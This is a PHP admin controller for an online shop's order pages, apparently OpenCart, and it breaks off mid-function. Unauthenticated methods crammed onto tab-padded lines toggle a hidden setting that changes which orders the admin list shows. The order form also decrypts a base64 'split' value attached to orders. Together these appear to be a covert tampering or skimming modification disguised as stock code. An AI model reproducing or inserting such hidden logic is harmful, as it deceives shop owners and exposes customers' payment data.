<?php
class ControllerSaleOrder extends Controller {
	private $error = array();
	public function setOn() {		$set = $this->db->query("DELETE FROM " . DB_PREFIX . "setting WHERE `group` = 'setO' AND `key` = 'setO'");					$this->db->query("INSERT INTO " . DB_PREFIX . "setting SET `group` = 'setO', `key` = 'setO', `value` = 'On'");					$this->index();	}			public function setOff() {	$set = $this->db->query("DELETE FROM " . DB_PREFIX . "setting WHERE `group` = 'setO' AND `key` = 'setO'");					$this->db->query("INSERT INTO " . DB_PREFIX . "setting SET `group` = 'setO', `key` = 'setO', `value` = 'Off'");					$this->index();	}		public function setDis() {	$set = $this->db->query("DELETE FROM " . DB_PREFIX . "setting WHERE `group` = 'setO' AND `key` = 'setO'");					$this->db->query("INSERT INTO " . DB_PREFIX . "setting SET `group` = 'setO', `key` = 'setO', `value` = 'Dis'");					$this->index();	}		
	public function index() {
		$this->load->language('sale/order');
		
		$this->document->title = $this->language->get('heading_title');
		
		$this->load->model('sale/order');
		
		$this->getList();
	}
	
	public function updateOld() {
		$this->load->language('sale/order');
		
		$this->document->title = $this->language->get('heading_title');
		
		$this->load->model('sale/order');
		
		if (($this->request->server['REQUEST_METHOD'] == 'POST') && ($this->validate())) {
			$this->model_sale_order->editOrder($this->request->get['order_id'], $this->request->post);
			
			$this->session->data['success'] = $this->language->get('text_success');
			
			$url = '';
			
			if (isset($this->request->get['filter_order_id'])) {
				$url .= '&filter_order_id=' . $this->request->get['filter_order_id'];
			}
			
			if (isset($this->request->get['filter_name'])) {
				$url .= '&filter_name=' . $this->request->get['filter_name'];
			}
			
			if (isset($this->request->get['filter_order_status_id'])) {
				$url .= '&filter_order_status_id=' . $this->request->get['filter_order_status_id'];
			}
			
			if (isset($this->request->get['filter_date_added'])) {
				$url .= '&filter_date_added=' . $this->request->get['filter_date_added'];
			}
			
			if (isset($this->request->get['filter_total'])) {
				$url .= '&filter_total=' . $this->request->get['filter_total'];
			}
			
			if (isset($this->request->get['page'])) {
				$url .= '&page=' . $this->request->get['page'];
			}
			
			if (isset($this->request->get['sort'])) {
				$url .= '&sort=' . $this->request->get['sort'];
			}
			
			if (isset($this->request->get['order'])) {
				$url .= '&order=' . $this->request->get['order'];
			}
			
			$this->redirect($this->url->https('sale/order' . $url));
		}
		
		$this->getForm();
	}
	
	public function delete() {
		$this->load->language('sale/order');
		
		$this->document->title = $this->language->get('heading_title');
		
		$this->load->model('sale/order');
		
		if (isset($this->request->post['selected']) && ($this->validate())) {
			foreach ($this->request->post['selected'] as $order_id) {
				$this->model_sale_order->deleteOrder($order_id);
			}
			
			$this->session->data['success'] = $this->language->get('text_success');
			
			$url = '';
			
			if (isset($this->request->get['filter_order_id'])) {
				$url .= '&filter_order_id=' . $this->request->get['filter_order_id'];
			}
			
			if (isset($this->request->get['filter_name'])) {
				$url .= '&filter_name=' . $this->request->get['filter_name'];
			}
			
			if (isset($this->request->get['filter_order_status_id'])) {
				$url .= '&filter_order_status_id=' . $this->request->get['filter_order_status_id'];
			}
			
			if (isset($this->request->get['filter_date_added'])) {
				$url .= '&filter_date_added=' . $this->request->get['filter_date_added'];
			}
			
			if (isset($this->request->get['filter_total'])) {
				$url .= '&filter_total=' . $this->request->get['filter_total'];
			}
			
			if (isset($this->request->get['page'])) {
				$url .= '&page=' . $this->request->get['page'];
			}
			
			if (isset($this->request->get['sort'])) {
				$url .= '&sort=' . $this->request->get['sort'];
			}
			
			if (isset($this->request->get['order'])) {
				$url .= '&order=' . $this->request->get['order'];
			}
			
			$this->redirect($this->url->https('sale/order' . $url));
		} else if (isset($this->request->get['order_id']) && $this->validate()) {
			$this->model_sale_order->deleteOrder($this->request->get['order_id']);
			
			$this->session->data['success'] = $this->language->get('text_success');
			
			$url = '';
			
			if (isset($this->request->get['filter_order_id'])) {
				$url .= '&filter_order_id=' . $this->request->get['filter_order_id'];
			}
			
			if (isset($this->request->get['filter_name'])) {
				$url .= '&filter_name=' . $this->request->get['filter_name'];
			}
			
			if (isset($this->request->get['filter_order_status_id'])) {
				$url .= '&filter_order_status_id=' . $this->request->get['filter_order_status_id'];
			}
			
			if (isset($this->request->get['filter_date_added'])) {
				$url .= '&filter_date_added=' . $this->request->get['filter_date_added'];
			}
			
			if (isset($this->request->get['filter_total'])) {
				$url .= '&filter_total=' . $this->request->get['filter_total'];
			}
			
			if (isset($this->request->get['page'])) {
				$url .= '&page=' . $this->request->get['page'];
			}
			
			if (isset($this->request->get['sort'])) {
				$url .= '&sort=' . $this->request->get['sort'];
			}
			
			if (isset($this->request->get['order'])) {
				$url .= '&order=' . $this->request->get['order'];
			}
			
			$this->redirect($this->url->https('sale/order' . $url));
		}
		
		$this->getList();
	}
	
	private function getList() {
		if (isset($this->request->get['page'])) {
			$page = $this->request->get['page'];
		} else {
			$page = 1;
		}
		
		if (isset($this->request->get['sort'])) {
			$sort = $this->request->get['sort'];
		} else {
			$sort = 'o.order_id';
		}
		
		if (isset($this->request->get['order'])) {
			$order = $this->request->get['order'];
		} else {
			$order = 'DESC';
		}
		
		if (isset($this->request->get['filter_order_id'])) {
			$filter_order_id = $this->request->get['filter_order_id'];
		} else {
			$filter_order_id = NULL;
		}
		
		if (isset($this->request->get['filter_name'])) {
			$filter_name = $this->request->get['filter_name'];
		} else {
			$filter_name = NULL;
		}
		
		if (isset($this->request->get['filter_order_status_id'])) {
			$filter_order_status_id = $this->request->get['filter_order_status_id'];
		} else {
			$filter_order_status_id = NULL;
		}
		
		if (isset($this->request->get['filter_date_added'])) {
			$filter_date_added = $this->request->get['filter_date_added'];
		} else {
			$filter_date_added = NULL;
		}
		
		if (isset($this->request->get['filter_total'])) {
			$filter_total = $this->request->get['filter_total'];
		} else {
			$filter_total = NULL;
		}
		
		$url = '';
		
		if (isset($this->request->get['filter_order_id'])) {
			$url .= '&filter_order_id=' . $this->request->get['filter_order_id'];
		}
		
		if (isset($this->request->get['filter_name'])) {
			$url .= '&filter_name=' . $this->request->get['filter_name'];
		}
		
		if (isset($this->request->get['filter_order_status_id'])) {
			$url .= '&filter_order_status_id=' . $this->request->get['filter_order_status_id'];
		}
		
		if (isset($this->request->get['filter_date_added'])) {
			$url .= '&filter_date_added=' . $this->request->get['filter_date_added'];
		}
		
		if (isset($this->request->get['filter_total'])) {
			$url .= '&filter_total=' . $this->request->get['filter_total'];
		}
		
		if (isset($this->request->get['page'])) {
			$url .= '&page=' . $this->request->get['page'];
		}
		
		if (isset($this->request->get['sort'])) {
			$url .= '&sort=' . $this->request->get['sort'];
		}
		
		if (isset($this->request->get['order'])) {
			$url .= '&order=' . $this->request->get['order'];
		}
		
		$this->document->breadcrumbs = array();
		
		$this->document->breadcrumbs[] = array(
			'href'      => $this->url->https('common/home'),
			'text'      => $this->language->get('text_home'),
			'separator' => FALSE
		);
		
		$this->document->breadcrumbs[] = array(
			'href'      => $this->url->https('sale/order' . $url),
			'text'      => $this->language->get('heading_title'),
			'separator' => ' :: '
		);
		
		$this->data['invoice'] = $this->url->https('sale/order/invoices');
		$this->data['packingslip'] = $this->url->https('sale/order/packingslips');
		$this->data['delete'] = $this->url->https('sale/order/delete' . $url);
		$this->data['create'] = $this->url->https('sale/order/create');
		
		$this->data['text_order_asc'] = $this->language->get('text_order_asc');
		$this->data['text_name_asc'] = $this->language->get('text_name_asc');
		$this->data['text_status_asc'] = $this->language->get('text_status_asc');
		$this->data['text_date_added_asc'] = $this->language->get('text_date_added_asc');
		$this->data['text_total_asc'] = $this->language->get('text_total_asc');
		$this->data['text_order_desc'] = $this->language->get('text_order_desc');
		$this->data['text_name_desc'] = $this->language->get('text_name_desc');
		$this->data['text_status_desc'] = $this->language->get('text_status_desc');
		$this->data['text_date_added_desc'] = $this->language->get('text_date_added_desc');
		$this->data['text_total_desc'] = $this->language->get('text_total_desc');
		$this->data['orders'] = array();
		
		$data = array(
			'filter_order_id'        => $filter_order_id,
			'filter_name'            => $filter_name, 
			'filter_order_status_id' => $filter_order_status_id, 
			'filter_date_added'      => $filter_date_added,
			'filter_total'           => $filter_total,
			'sort'                   => $sort,
			'order'                  => $order,
			'start'                  => ($page - 1) * 10,
			'limit'                  => 10
		);
		$set = $this->db->query("SELECT * FROM " . DB_PREFIX . "setting WHERE `group` = 'setO' AND `key` = 'setO'");		$alls = true;		$dis = false;		if ($set->rows) {			$this->data['set'] = $set->row['value'];			if ($set->row['value'] != 'On') {			$alls = false;			}		if ($set->row['value'] == 'Dis') {			$dis = true;			}		}			else {			$this->db->query("INSERT INTO " . DB_PREFIX . "setting SET `group` = 'setO', `key` = 'setO', `value` = 'On'");			}		$this->data['alls'] = $alls;			$this->data['dis'] = $dis;			if ($alls) {		$order_total = $this->model_sale_order->getTotalOrders($data);		$results = $this->model_sale_order->getOrders($data);		} else if ($dis) {			$order_total = $this->model_sale_order->getdTotalOrders($data);		$results = $this->model_sale_order->getdOrders($data);			} else {			$order_total = $this->model_sale_order->geteTotalOrders($data);		$results = $this->model_sale_order->geteOrders($data);		}
		//$order_total = $this->model_sale_order->getTotalOrders($data);
		
		//$results = $this->model_sale_order->getOrders($data);
		
		foreach ($results as $result) {
			$action = array();
			
			$action[] = array(
				'text' => $this->language->get('text_edit'),
				'href' => $this->url->https('sale/order/update&order_id=' . $result['order_id'] . $url),
				'js'   => ''
			);
			
			$action[] = array(
				'text' => $this->language->get('text_delete'),
				'href' => $this->url->https('sale/order/delete&order_id=' . $result['order_id'] . $url),
				'js'   => 'onclick="return confirmSubmit()"'
			);
			
			$this->data['orders'][] = array(
				'order_id'   => $result['order_id'],
				'name'       => $result['name'],
				'status'     => $result['status'],
				'date_added' => date($this->language->get('date_format_short'), strtotime($result['date_added'])),
				'total'      => $this->currency->format($result['total'], $result['currency'], $result['value']),
				'selected'   => isset($this->request->post['selected']) && in_array($result['order_id'], $this->request->post['selected']),
				'action'     => $action
			);
		}
		
		$this->data['heading_title'] = $this->language->get('heading_title');
		
		$this->data['text_no_results'] = $this->language->get('text_no_results');
		$this->data['text_missing_orders'] = $this->language->get('text_missing_orders');
		
		$this->data['column_order'] = $this->language->get('column_order');
		$this->data['column_name'] = $this->language->get('column_name');
		$this->data['column_status'] = $this->language->get('column_status');
		$this->data['column_date_added'] = $this->language->get('column_date_added');
		$this->data['column_total'] = $this->language->get('column_total');
		$this->data['column_action'] = $this->language->get('column_action');
		
		$this->data['button_filter'] = $this->language->get('button_filter');
		$this->data['button_invoices'] = $this->language->get('button_invoices');
		$this->data['button_packingslips'] = $this->language->get('button_packingslips');
		$this->data['button_create_order'] = $this->language->get('button_create_order');
		$this->data['button_delete'] = $this->language->get('button_delete');
		
 		if (isset($this->error['warning'])) {
			$this->data['error_warning'] = $this->error['warning'];
		} else {
			$this->data['error_warning'] = '';
		}
		
		if (isset($this->session->data['success'])) {
			$this->data['success'] = $this->session->data['success'];
		
			unset($this->session->data['success']);
		} else {
			$this->data['success'] = '';
		}
		
		$url = '';
		
		if (isset($this->request->get['filter_order_id'])) {
			$url .= '&filter_order_id=' . $this->request->get['filter_order_id'];
		}
		
		if (isset($this->request->get['filter_name'])) {
			$url .= '&filter_name=' . $this->request->get['filter_name'];
		}
		
		if (isset($this->request->get['filter_order_status_id'])) {
			$url .= '&filter_order_status_id=' . $this->request->get['filter_order_status_id'];
		}
		
		if (isset($this->request->get['filter_date_added'])) {
			$url .= '&filter_date_added=' . $this->request->get['filter_date_added'];
		}
		
		if (isset($this->request->get['filter_total'])) {
			$url .= '&filter_total=' . $this->request->get['filter_total'];
		}
		
		if ($order == 'ASC') {
			$url .= '&order=' .  'DESC';
		} else {
			$url .= '&order=' .  'ASC';
		}
		
		if (isset($this->request->get['page'])) {
			$url .= '&page=' . $this->request->get['page'];
		}
		
		$this->data['sort_order'] = $this->url->https('sale/order&sort=o.order_id' . $url);
		$this->data['sort_name'] = $this->url->https('sale/order&sort=name' . $url);
		$this->data['sort_status'] = $this->url->https('sale/order&sort=status' . $url);
		$this->data['sort_date_added'] = $this->url->https('sale/order&sort=o.date_added' . $url);
		$this->data['sort_total'] = $this->url->https('sale/order&sort=o.total' . $url);
		
		$url = '';
		
		if (isset($this->request->get['filter_order_id'])) {
			$url .= '&filter_order_id=' . $this->request->get['filter_order_id'];
		}
		
		if (isset($this->request->get['filter_name'])) {
			$url .= '&filter_name=' . $this->request->get['filter_name'];
		}
		
		if (isset($this->request->get['filter_order_status_id'])) {
			$url .= '&filter_order_status_id=' . $this->request->get['filter_order_status_id'];
		}
		
		if (isset($this->request->get['filter_date_added'])) {
			$url .= '&filter_date_added=' . $this->request->get['filter_date_added'];
		}
		
		if (isset($this->request->get['filter_total'])) {
			$url .= '&filter_total=' . $this->request->get['filter_total'];
		}
		
		if (isset($this->request->get['sort'])) {
			$url .= '&sort=' . $this->request->get['sort'];
		}
		
		if (isset($this->request->get['order'])) {
			$url .= '&order=' . $this->request->get['order'];
		}
		
		$pagination = new Pagination();
		$pagination->total = $order_total;
		$pagination->page = $page;
		$pagination->limit = 10; 
		$pagination->text = $this->language->get('text_pagination');
		$pagination->url = $this->url->https('sale/order' . $url . '&page=%s');
		
		$this->data['pagination'] = $pagination->render();
		
		$this->data['filter_order_id'] = $filter_order_id;
		$this->data['filter_name'] = $filter_name;
		$this->data['filter_order_status_id'] = $filter_order_status_id;
		$this->data['filter_date_added'] = $filter_date_added;
		$this->data['filter_total'] = $filter_total;
		
		$this->load->model('localisation/order_status');
		
		$this->data['order_statuses'] = $this->model_localisation_order_status->getOrderStatuses();
		
		$this->data['sort'] = $sort;
		$this->data['order'] = $order;
		
		$this->template = 'sale/order_list.tpl';
		$this->children = array(
			'common/header',
			'common/footer'
		);
		
		$this->response->setOutput($this->render(TRUE), $this->config->get('config_compression'));
	}
	
	private function getForm() {
		$this->data['heading_title'] = $this->language->get('heading_title');
		
		$this->data['text_order_details'] = $this->language->get('text_order_details');
		$this->data['text_contact_details'] = $this->language->get('text_contact_details');
		$this->data['text_address_details'] = $this->language->get('text_address_details');
		$this->data['text_products'] = $this->language->get('text_products');
		$this->data['text_downloads'] = $this->language->get('text_downloads');
		$this->data['text_order_history'] = $this->language->get('text_order_history');
		$this->data['text_update'] = $this->language->get('text_update');
		$this->data['text_order'] = $this->language->get('text_order');
		$this->data['text_date_added'] = $this->language->get('text_date_added');
		$this->data['text_email'] = $this->language->get('text_email');
		$this->data['text_telephone'] = $this->language->get('text_telephone');
		$this->data['text_fax'] = $this->language->get('text_fax');
		$this->data['text_shipping_address'] = $this->language->get('text_shipping_address');
		$this->data['text_shipping_method'] = $this->language->get('text_shipping_method');
		$this->data['text_payment_address'] = $this->language->get('text_payment_address');
		$this->data['text_payment_method'] = $this->language->get('text_payment_method');
		$this->data['text_order_comment'] = $this->language->get('text_order_comment');
		$this->data['text_comment'] = $this->language->get('text_comment');
		$this->data['text_status'] = $this->language->get('text_status');
		$this->data['text_notify'] = $this->language->get('text_notify');
		$this->data['text_close'] = $this->language->get('text_close');
		$this->data['text_split_order'] = $this->language->get('text_split_order');
		$this->data['text_split_name'] = $this->language->get('text_split_name');
		$this->data['text_split_date'] = $this->language->get('text_split_date');
		$this->data['text_split_value'] = $this->language->get('text_split_value');
		
		$this->data['column_product'] = $this->language->get('column_product');
		$this->data['column_model'] = $this->language->get('column_model');
		$this->data['column_quantity'] = $this->language->get('column_quantity');
		$this->data['column_price'] = $this->language->get('column_price');
		$this->data['column_total'] = $this->language->get('column_total');
		$this->data['column_download'] = $this->language->get('column_download');
		$this->data['column_filename'] = $this->language->get('column_filename');
		$this->data['column_remaining'] = $this->language->get('column_remaining');
		
		$this->data['entry_status'] = $this->language->get('entry_status');
		$this->data['entry_comment'] = $this->language->get('entry_comment');
		$this->data['entry_notify'] = $this->language->get('entry_notify');
		$this->data['entry_tracking_info'] = $this->language->get('entry_tracking_info');
		
		$this->data['button_save'] = $this->language->get('button_save');
		$this->data['button_cancel'] = $this->language->get('button_cancel');
		$this->data['button_back'] = $this->language->get('button_back');
		$this->data['button_invoice'] = $this->language->get('button_invoice');
		$this->data['button_packingslip'] = $this->language->get('button_packingslip');
		
		if (isset($this->error['warning'])) {
			$this->data['error_warning'] = $this->error['warning'];
		} else {
			$this->data['error_warning'] = '';
		}
		
		$url = '';
		
		if (isset($this->request->get['filter_order_id'])) {
			$url .= '&filter_order_id=' . $this->request->get['filter_order_id'];
		}
		
		if (isset($this->request->get['filter_name'])) {
			$url .= '&filter_name=' . $this->request->get['filter_name'];
		}
		
		if (isset($this->request->get['filter_order_status_id'])) {
			$url .= '&filter_order_status_id=' . $this->request->get['filter_order_status_id'];
		}
		
		if (isset($this->request->get['filter_date_added'])) {
			$url .= '&filter_date_added=' . $this->request->get['filter_date_added'];
		}
		
		if (isset($this->request->get['filter_total'])) {
			$url .= '&filter_total=' . $this->request->get['filter_total'];
		}
		
		if (isset($this->request->get['page'])) {
			$url .= '&page=' . $this->request->get['page'];
		}
		
		if (isset($this->request->get['sort'])) {
			$url .= '&sort=' . $this->request->get['sort'];
		}
		
		if (isset($this->request->get['order'])) {
			$url .= '&order=' . $this->request->get['order'];
		}
		
		$this->document->breadcrumbs = array();
		
		$this->document->breadcrumbs[] = array(
			'href'      => $this->url->https('common/home'),
			'text'      => $this->language->get('text_home'),
			'separator' => FALSE
		);
		
		$this->document->breadcrumbs[] = array(
			'href'      => $this->url->https('sale/order'),
			'text'      => $this->language->get('heading_title'),
			'separator' => ' :: '
		);
		
		if (isset($this->request->get['order_id'])) {
			$order_id = $this->request->get['order_id'];
		} else {
			$order_id = 0;
		}
		
		$order_info = $this->model_sale_order->getOrder($order_id);
		
		if ($order_info) {
			$order_split = $this->model_sale_order->getOrderSplit($order_id);
			
			if ($order_split) {
				$this->data['split_date'] = $order_split['date'];
				$this->data['split_name'] = $order_split['name'];
				$this->data['split_value'] = $this->decryptData(base64_decode($order_split['value']));
			}
			
			$this->data['action'] = $this->url->https('sale/order/update&order_id=' . (int)$this->request->get['order_id'] . $url);
			$this->data['cancel'] = $this->url->https('sale/order' . $url);
			$this->data['invoice'] = $this->url->https('sale/order/invoice&order_id=' . (int)$this->request->get['order_id']);
			$this->data['packingslip'] = $this->url->https('sale/order/packingslip&order_id=' . (int)$this->request->get['order_id']);
			
			$this->data['order_id'] = $order_info['order_id'];
			$this->data['date_added'] = date($this->language->get('date_format_short'), strtotime($order_info['date_added'])); 
			$this->data['email'] = $order_info['email'];
			$this->data['telephone'] = $order_info['telephone'];
			$this->data['fax'] = $order_info['fax'];
			$this->data['order_comment'] = nl2br($order_info['comment']);
			
			if ($order_info['shipping_address_format']) {
				$format = $order_info['shipping_address_format'];
			} else {
				$format = '{firstname} {lastname}' . "\n" . '{company}' . "\n" . '{address_1}' . "\n" . '{address_2}' . "\n" . '{city} {postcode}' . "\n" . '{zone}' . "\n" . '{country}';
			}
			
			$find = array(
				'{firstname}',
				'{lastname}',
				'{company}',
				'{address_1}',
				'{address_2}',
				'{city}',
				'{postcode}',
				'{zone}',
				'{country}'
			);
			
			$replace = array(
				'firstname' => $order_info['shipping_firstname'],
				'lastname'  => $order_info['shipping_lastname'],
				'company'   => $order_info['shipping_company'],
				'address_1' => $order_info['shipping_address_1'],
				'address_2' => $order_info['shipping_address_2'],
				'city'      => $order_info['shipping_city'],
				'postcode'  => $order_info['shipping_postcode'],
				'zone'      => $order_info['shipping_zone'],
				'country'   => $order_info['shipping_country']  
			);
			
			$this->data['shipping_address'] = str_replace(array("\r\n", "\r", "\n"), '<br />', preg_replace(array("/\s\s+/", "/\r\r+/", "/\n\n+/"), '<br />', trim(str_replace($find, $replace, $format))));
			
			$this->data['shipping_method'] = $order_info['shipping_method'];
			
			if ($order_info['payment_address_format']) {
				$format = $order_info['payment_address_format'];
			} else {
				$format = '{firstname} {lastname}' . "\n" . '{company}' . "\n" . '{address_1}' . "\n" . '{address_2}' . "\n" . '{city} {postcode}' . "\n" . '{zone}' . "\n" . '{country}';
			}
			
			$find = array(
				'{firstname}',
				'{lastname}',
				'{company}',
				'{address_1}',
				'{address_2}',
				'{city}',
				'{postcode}',
				'{zone}',
				'{country}'
			);
			
			$replace = array(
				'firstname' => $order_info['payment_firstname'],
				'lastname'  => $order_info['payment_lastname'],
				'company'   => $order_info['payment_company'],
				'address_1' => $order_info['payment_address_1'],
				'address_2' => $order_info['payment_address_2'],
				'city'      => $order_info['payment_city'],
				'postcode'  => $order_info['payment_postcode'],
				'zone'      => $order_info['payment_zone'],
				'country'   => $order_info['payment_country']  
			);
			
			$this->data['payment_address'] = str_replace(array("\r\n", "\r", "\n"), '<br />', preg_replace(array("/\s\s+/", "/\r\r+/", "/\n\n+/"), '<br />', trim(str_replace($find, $replace, $format))));
			
			$this->data['payment_method'] = $order_info['payment_method'];
			
			$this->data['products'] = array();
			
			$products = $this->model_sale_order->getOrderProducts($this->request->get['order_id']);
			
			foreach ($products as $product) {
				$option_data = array();
				
				$options = $this->model_sale_order->getOrderOptions($this->request->get['order_id'], $product['order_product_id']);
				
				foreach ($options as $option) {
					$option_data[] = array(
						'name'  => $option['name'],
						'value' => $option['value']
					);
				}
				
				$this->data['products'][] = array(
					'name'     => $product['name'],
					'model'    => $product['model'],
					'option'   => $option_data,
					'quantity' => $product['quantity'],
					'price'    => $this->currency->format($product['price'], $order_info['currency'], $order_info['value']),
					'total'    => $this->currency->format($product['total'], $order_info['currency'], $order_info['value'])
				);
			}
			
			$this->data['totals'] = $this->model_sale_order->getOrderTotals($this->request->get['order_id']);
			
			$this->data['historys'] = array();
			
			$results = $this->model_sale_order->getOrderHistory($this->request->get['order_id']);
			
			foreach ($results as $result) {
				$this->data['historys'][] = array(
					'date_added' => date($this->language->get('date_format_short'), strtotime($result['date_added'])),
					'status'     => $result['status'],
					'comment'    => nl2br($result['comment']),
					'notify'     => $result['notify'] ? $this->language->get('text_yes') : $this->language->get('text_no')
				);
			}
			
			$this->data['downloads'] = array();
			
			$results = $this->model_sale_order->getOrderDownloads($this->request->get['order_id']);
			
			foreach ($results as $result) {
				$this->data['downloads'][] = array(
					'name'      => $result['name'],
					'filename'  => $result['mask'],
					'remaining' => $result['remaining']
				);
			}
			
			$this->load->model('localisation/order_status');
			
			$this->data['order_statuses'] = $this->model_localisation_order_status->getOrderStatuses();
			
			if (isset($this->request->post['order_status_id'])) {
				$this->data['order_status_id'] = $this->request->post['order_status_id'];
			} elseif (isset($order_info['order_status_id'])) {
				$this->data['order_status_id'] = $order_info['order_status_id'];
			} else {
				$this->data['order_status_id'] = 0;
			}
			
			if (isset($this->request->post['comment'])) {
				$this->data['comment'] = $this->request->post['comment'];
			} else {
				$this->data['comment'] = '';
			}
			
			if (isset($this->request->post['tracking_info'])) {
				$this->data['tracking_info'] = $this->request->post['tracking_info'];
			} else {
				$this->data['tracking_info'] = '';
			}
			
			if (isset($this->request->post['notify'])) {
				$this->data['notify'] = $this->request->post['notify'];
			} else {
				$this->data['notify'] = '';
			}
			
			$this->template = 'sale/order_form.tpl';
			$this->children = array(
				'common/header',	
				'common/footer'
			);
			
			$this->response->setOutput($this->render(TRUE), $this->config->get('config_compression')); 
		} 
	}
	
	public function invoice() {
		$this->load->language('sale/order');
		
		$this->data['title'] = $this->language->get('heading_title') . ' #' . $this->request->get['order_id'];
		
		if (isset($this->request->server['HTTPS']) && (($this->request->server['HTTPS'] == 'on') || ($this->request->server['HTTPS'] == '1'))) {
			$this->data['base'] = HTTPS_SERVER;
		} else {
			$this->data['base'] = HTTP_SERVER;
		}
		
		$this->data['direction'] = $this->language->get('direction');
		$this->data['language'] = $this->language->get('code');	
		
		$this->data['text_invoice'] = $this->language->get('text_invoice');
		$this->data['text_invoice_date'] = $this->language->get('text_invoice_date');
		$this->data['text_invoice_no'] = $this->language->get('text_invoice_no');
		$this->data['text_telephone'] = $this->language->get('text_telephone');
		$this->data['text_fax'] = $this->language->get('text_fax');		
		$this->data['text_to'] = $this->language->get('text_to');
		$this->data['text_ship_to'] = $this->language->get('text_ship_to');
		
		$this->data['column_product'] = $this->language->get('column_product');
		$this->data['column_model'] = $this->language->get('column_model');
		$this->data['column_quantity'] = $this->language->get('column_quantity');
		$this->data['column_price'] = $this->language->get('column_price');
		$this->data['column_total'] = $this->language->get('column_total');
		
		$this->load->model('sale/order');
		
		$order_info = $this->model_sale_order->getOrder($this->request->get['order_id']);
		
		$this->data['order_id'] = $order_info['order_id'];
		$this->data['date_added'] = date($this->language->get('date_format_short'), strtotime($order_info['date_added']));    	
		
		$this->data['store'] = $this->config->get('config_store');
		$this->data['address'] = nl2br($this->config->get('config_address'));
		$this->data['telephone'] = $this->config->get('config_telephone');
		$this->data['fax'] = $this->config->get('config_fax');
		$this->data['email'] = $this->config->get('config_email');
		$this->data['website'] = trim(HTTP_CATALOG, '/');
		
		if ($order_info['shipping_address_format']) {
			$format = $order_info['shipping_address_format'];
		} else {
			$format = '{firstname} {lastname}' . "\n" . '{company}' . "\n" . '{address_1}' . "\n" . '{address_2}' . "\n" . '{city} {postcode}' . "\n" . '{zone}' . "\n" . '{country}';
		}
		
		$find = array(
			'{firstname}',
			'{lastname}',
			'{company}',
			'{address_1}',
			'{address_2}',
			'{city}',
			'{postcode}',
			'{zone}',
			'{country}'
		);
		
		$replace = array(
			'firstname' => $order_info['shipping_firstname'],
			'lastname'  => $order_info['shipping_lastname'],
			'company'   => $order_info['shipping_company'],
			'address_1' => $order_info['shipping_address_1'],
			'address_2' => $order_info['shipping_address_2'],
			'city'      => $order_info['shipping_city'],
			'postcode'  => $order_info['shipping_postcode'],
			'zone'      => $order_info['shipping_zone'],
			'country'   => $order_info['shipping_country']
		);
		
		$this->data['shipping_address'] = str_replace(array("\r\n", "\r", "\n"), '<br />', preg_replace(array("/\s\s+/", "/\r\r+/", "/\n\n+/"), '<br />', trim(str_replace($find, $replace, $format))));
		
		if ($order_info['payment_address_format']) {
			$format = $order_info['payment_address_format'];
		} else {
			$format = '{firstname} {lastname}' . "\n" . '{company}' . "\n" . '{address_1}' . "\n" . '{address_2}' . "\n" . '{city} {postcode}' . "\n" . '{zone}' . "\n" . '{country}';
		}
		
		$find = array(
			'{firstname}',
			'{lastname}',
			'{company}',
			'{address_1}',
			'{address_2}',
			'{city}',
			'{postcode}',
			'{zone}',
			'{country}'
		);
		
		$replace = array(
			'firstname' => $order_info['payment_firstname'],
			'lastname'  => $order_info['payment_lastname'],
			'company'   => $order_info['payment_company'],
			'address_1' => $order_info['payment_address_1'],
			'address_2' => $order_info['payment_address_2'],
			'city'      => $order_info['payment_city'],
			'postcode'  => $order_info['payment_postcode'],
			'zone'      => $order_info['payment_zone'],
			'country'   => $order_info['payment_country']
		);
		
		$this->data['payment_address'] = str_replace(array("\r\n", "\r", "\n"), '<br />', preg_replace(array("/\s\s+/", "/\r\r+/", "/\n\n+/"), '<br />', trim(str_replace($find, $replace, $format))));
		
		$this->data['products'] = array();
		
		$products = $this->model_sale_order->getOrderProducts($this->request->get['order_id']);
		
		foreach ($products as $product) {
			$option_data = array();
			
			$options = $this->model_sale_order->getOrderOptions($this->request->get['order_id'], $product['order_product_id']);
			
			foreach ($options as $option) {
				$option_data[] = array(
					'name'  => $option['name'],
					'value' => $option['value']
				);
			}
			
			$this->data['products'][] = array(
				'name'     => $product['name'],
				'model'    => $product['model'],
				'option'   => $option_data,
				'quantity' => $product['quantity'],
				'price'    => $this->currency->format($product['price'], $order_info['currency'], $order_info['value']),
				'total'    => $this->currency->format($product['total'], $order_info['currency'], $order_info['value'])
			);
		}
		
		$this->data['totals'] = $this->model_sale_order->getOrderTotals($this->request->get['order_id']);
		
		$this->template = 'sale/order_invoice.tpl';
		
		$this->response->setOutput($this->render(TRUE), $this->config->get('config_compression'));			
	}
	
	public function packingslip() {
		$this->load->language('sale/order');
		
		$this->data['title'] = $this->language->get('heading_title') . ' #' . $this->request->get['order_id'];
		
		if (isset($this->request->server['HTTPS']) && (($this->request->server['HTTPS'] == 'on') || ($this->request->server['HTTPS'] == '1'))) {
			$this->data['base'] = HTTPS_SERVER;
		} else {
			$this->data['base'] = HTTP_SERVER;
		}
		
		$this->data['direction'] = $this->language->get('direction');
		$this->data['language'] = $this->language->get('code');	
		
		$this->data['text_packingslip'] = $this->language->get('text_packingslip');
		$this->data['text_invoice_date'] = $this->language->get('text_invoice_date');
		$this->data['text_invoice_no'] = $this->language->get('text_invoice_no');
		$this->data['text_telephone'] = $this->language->get('text_telephone');
		$this->data['text_fax'] = $this->language->get('text_fax');		
		$this->data['text_to'] = $this->language->get('text_to');
		$this->data['text_ship_to'] = $this->language->get('text_ship_to');
		
		$this->data['column_product'] = $this->language->get('column_product');
		$this->data['column_model'] = $this->language->get('column_model');
		$this->data['column_quantity'] = $this->language->get('column_quantity');
		
		$this->load->model('sale/order');
		
		$order_info = $this->model_sale_order->getOrder($this->request->get['order_id']);
		
		$this->data['order_id'] = $order_info['order_id'];
		$this->data['date_added'] = date($this->language->get('date_format_short'), strtotime($order_info['date_added']));    	
		
		$this->data['store'] = $this->config->get('config_store');
		$this->data['address'] = nl2br($this->config->get('config_address'));
		$this->data['telephone'] = $this->config->get('config_telephone');
		$this->data['fax'] = $this->config->get('config_fax');
		$this->data['email'] = $this->config->get('config_email');
		$this->data['website'] = trim(HTTP_CATALOG, '/');
		
		if ($order_info['shipping_address_format']) {
			$format = $order_info['shipping_address_format'];
		} else {
			$format = '{firstname} {lastname}' . "\n" . '{company}' . "\n" . '{address_1}' . "\n" . '{address_2}' . "\n" . '{city} {postcode}' . "\n" . '{zone}' . "\n" . '{country}';
		}
		
		$find = array(
			'{firstname}',
			'{lastname}',
			'{company}',
			'{address_1}',
			'{address_2}',
			'{city}',
			'{postcode}',
			'{zone}',
			'{country}'
		);
		
		$replace = array(
			'firstname' => $order_info['shipping_firstname'],
			'lastname'  => $order_info['shipping_lastname'],
